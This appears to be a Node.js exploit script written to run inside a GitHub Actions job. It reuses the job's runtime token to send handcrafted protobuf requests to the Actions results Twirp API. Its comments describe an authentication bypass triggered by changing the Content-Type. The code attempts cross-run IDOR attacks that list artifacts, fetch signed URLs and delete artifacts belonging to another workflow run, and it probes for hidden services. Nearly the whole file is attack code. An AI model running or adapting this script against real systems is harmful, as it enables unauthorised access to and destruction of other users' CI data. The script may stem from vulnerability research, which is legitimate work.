const https = require('https');
const fs = require('fs');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';

function encodeProto(fields) {
  // Minimal protobuf encoder
  // fields: [{fieldNum, type, value}] where type 2 = string/bytes
  const parts = [];
  for (const f of fields) {
    const tag = (f.fieldNum << 3) | f.type;
    if (f.type === 2) {
      const bytes = Buffer.from(f.value, 'utf8');
      parts.push(encodeVarint(tag));
      parts.push(encodeVarint(bytes.length));
      parts.push(bytes);
    }
  }
  return Buffer.concat(parts);
}

function encodeVarint(n) {
  const bytes = [];
  while (n > 127) {
    bytes.push((n & 0x7f) | 0x80);
    n >>>= 7;
  }
  bytes.push(n);
  return Buffer.from(bytes);
}

function doProtoRequest(options, protoBody) {
  return new Promise((resolve) => {
    const headers = {
      'Authorization': 'Bearer ' + RUNTIME_TOKEN,
      'Content-Type': 'application/protobuf',
      'Accept': 'application/protobuf',
      'Content-Length': String(protoBody.length),
    };
    const req = https.request({ ...options, headers }, (res) => {
      const chunks = [];
      res.on('data', (chunk) => chunks.push(chunk));
      res.on('end', () => {
        const raw = Buffer.concat(chunks);
        resolve({ status: res.statusCode, raw, text: raw.toString('utf8').substring(0, 600), headers: res.headers });
      });
    });
    req.on('error', (e) => resolve({ status: 'ERROR', text: e.message, raw: Buffer.alloc(0) }));
    req.write(protoBody);
    req.end();
  });
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) {
    console.log('Missing RESULTS_URL or RUNTIME_TOKEN');
    return;
  }

  const host = new URL(RESULTS_URL).hostname;
  const currentUUID = ORCHESTRATION_ID.split('.')[0];
  const previousRunUUID = 'b55c9da0-4a06-4590-ae64-d1ca22909520';
  const ZERO_UUID = '00000000-0000-0000-0000-000000000000';

  console.log('Host:', host, '| Current UUID:', currentUUID);

  // === CRITICAL: Protobuf Content-Type bypasses JSON auth on ListArtifacts ===
  // JSON body → 401 "invalid auth token"
  // Protobuf Content-Type + JSON body → 400 "malformed" (auth PASSED!)
  // Now sending VALID protobuf body to ListArtifacts

  // Test A: Empty protobuf (no fields set = list all artifacts the token can see)
  const emptyProto = Buffer.alloc(0);
  const rA = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', method: 'POST' }, emptyProto);
  console.log('\n[PROTO A] ListArtifacts empty proto body:');
  console.log('Status:', rA.status, '| Text:', rA.text);
  if (rA.raw.length > 0 && !rA.text.includes('code')) {
    console.log('RAW HEX (first 200):', rA.raw.slice(0, 200).toString('hex'));
  }

  // Test B: ListArtifacts with current run UUID as workflowRunBackendId (field 1)
  const currentProto = encodeProto([{ fieldNum: 1, type: 2, value: currentUUID }]);
  const rB = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', method: 'POST' }, currentProto);
  console.log('\n[PROTO B] ListArtifacts current run UUID:');
  console.log('Status:', rB.status, '| Text:', rB.text);
  if (rB.raw.length > 0 && !rB.text.includes('code')) {
    console.log('RAW HEX:', rB.raw.slice(0, 200).toString('hex'));
  }

  // Test C: ListArtifacts with PREVIOUS run UUID (cross-run IDOR via protobuf)
  const prevProto = encodeProto([{ fieldNum: 1, type: 2, value: previousRunUUID }]);
  const rC = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', method: 'POST' }, prevProto);
  console.log('\n[PROTO C] ListArtifacts PREVIOUS run UUID (cross-run IDOR via protobuf):');
  console.log('Status:', rC.status, '| Text:', rC.text);

  // Test D: ListArtifacts with zero UUID (wildcard attempt)
  const zeroProto = encodeProto([{ fieldNum: 1, type: 2, value: ZERO_UUID }]);
  const rD = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', method: 'POST' }, zeroProto);
  console.log('\n[PROTO D] ListArtifacts zero UUID:');
  console.log('Status:', rD.status, '| Text:', rD.text);

  // Test E: GetSignedArtifactURL via protobuf — try cross-run with PREVIOUS UUID
  // proto fields: 1=workflowRunBackendId, 2=name
  const signedUrlProto = encodeProto([
    { fieldNum: 1, type: 2, value: previousRunUUID },
    { fieldNum: 2, type: 2, value: 'probe-artifact-2' }
  ]);
  const rE = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', method: 'POST' }, signedUrlProto);
  console.log('\n[PROTO E] GetSignedArtifactURL cross-run via protobuf:');
  console.log('Status:', rE.status, '| Text:', rE.text);

  // Test F: Discover other Twirp services (CacheService, JobService, LogService)
  console.log('\n=== Twirp Service Discovery via Protobuf ===');
  for (const service of ['CacheService', 'JobService', 'LogService', 'WorkflowRunService', 'CheckService']) {
    const r = await doProtoRequest({
      hostname: host,
      path: `/twirp/github.actions.results.api.v1.${service}/GetStatus`,
      method: 'POST'
    }, emptyProto);
    console.log(`[SERVICE] ${service}/GetStatus: Status=${r.status} | Body=${r.text.substring(0, 100)}`);
  }

  // Test G: CreateArtifact via protobuf (was 401 in JSON, might pass in protobuf)
  // proto: field 1 = workflowRunBackendId, field 2 = workflowJobRunBackendId, field 3 = name
  const jobUUID = 'a7c45508-b684-5ee6-b081-35dc5557cf2d';
  const createProto = encodeProto([
    { fieldNum: 1, type: 2, value: currentUUID },
    { fieldNum: 2, type: 2, value: jobUUID },
    { fieldNum: 3, type: 2, value: 'probe-artifact-v6' }
  ]);
  const rG = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', method: 'POST' }, createProto);
  console.log('\n[PROTO G] CreateArtifact via protobuf (was 401 in JSON):');
  console.log('Status:', rG.status, '| Text:', rG.text);

  // Test H: DeleteArtifact via protobuf with PREVIOUS run UUID
  const delProto = encodeProto([
    { fieldNum: 1, type: 2, value: previousRunUUID },
    { fieldNum: 2, type: 2, value: jobUUID },
    { fieldNum: 3, type: 2, value: 'probe-artifact-2' }
  ]);
  const rH = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact', method: 'POST' }, delProto);
  console.log('\n[PROTO H] DeleteArtifact PREVIOUS run via protobuf:');
  console.log('Status:', rH.status, '| Text:', rH.text);
}

main().catch(e => console.log('Fatal error:', e.message));
